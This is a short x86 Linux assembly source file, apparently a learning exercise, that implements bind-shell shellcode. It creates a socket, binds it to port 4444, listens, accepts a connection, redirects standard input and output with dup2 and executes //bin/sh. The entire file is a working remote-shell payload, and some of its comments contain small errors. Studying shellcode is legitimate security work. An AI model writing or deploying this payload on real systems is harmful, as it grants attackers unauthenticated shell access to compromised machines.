;Swaroop Yermalkar
;bind_shell

global _start
section .text
_start:

xor ebx,ebx  ;zero out ebx
mul ebx ;zero out eax
;sock = socket(AF_INET, SOCK_STREAM, 0);
;1st argument: 0
;2nd argument: SOCK_STREAM = 0x1
;3rd argument: AF_INET = 0x2

mov al,0x66  ;socket call no is 102 and in hex it is 0x66
push ebx ;push 0 as first argument
inc ebx ; making ebx to 1
push ebx ;push 1 as second argument 
push byte 0x2 ;pushing 0x2 as third argument
mov ecx, esp ;moving pointer into ecx
int 0x80 ;and execute

mov esi, eax ;lets put socket call into esi so we can use it later

;bind(sock, (struct sockaddr *)&server, sockaddr_len);
 
;First argument - server.sin_addr.s_addr = INADDR_ANY; 
;Second argument - server.sin_port = htons(4444); //Using 4444 port
;Third argument - server.sin_family = AF_INET;

mov al,0x66 ;socket call. 101 in hex is 0x66
mov bl,2  ;this is for bind 
push edx 
push word 0x5c11 ;push port no 4444 using host to network conversion
push word bx ;Push 2 
mov ecx, esp ;pushing (struct sockaddr *)&server to ecx

;Now lets make bind call
;First argument -  sockaddr_len
;Second argument - (struct sockaddr *)&server
;Third argument - sock descriptor

push byte 0x10 ;sockaddr_len
push ecx ;(struct sockaddr *)&server
push esi ;socket call. Check line no 23, we had saved sock() call in esi.
mov ecx, esp ;Moving these arguments into ecx
int 0x80 ;and execute

;listen(sock, 2)

mov al,0x66 ;socket call. 101 in hex is 0x66
mov bl,4 ;for listen
push ebx ;push 2 on stack as first argument
push esi ;socket call. Check line no 23, we had saved sock() call in esi.
mov ecx,esp ;save arguments into ecx
int 0x80 ;and make listen call

;new = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
;This is from client socket descriptor
mov al,0x66 ;socket call. 101 in hex is 0x66
mov bl,5 ;for accept 
push edx 
push edx 
push esi
mov ecx, esp 
int 0x80

 ;dup2 call
 
  xchg eax, ebx     
  push BYTE 0x2     
  pop ecx ;Keeping ecx vlaue to 2 so we can use it as dup2 counter.
dup_loop:
  mov BYTE al, 0x3F ;syscall for dup2
  int 0x80    ;execute      
  dec ecx     ;decreasing counter      
  jns dup_loop      ;loop till sign flat not set.

;below is regaular execve call.
;execve(arguments[0], &arguments[0], NULL);

xor eax,eax
push eax 

;;for //bin/sh

push 0x68732f6e
push 0x69622f2f

mov ebx,esp

push eax
mov ecx,esp

push ebx
mov edx,esp

mov al,11
int 0x80
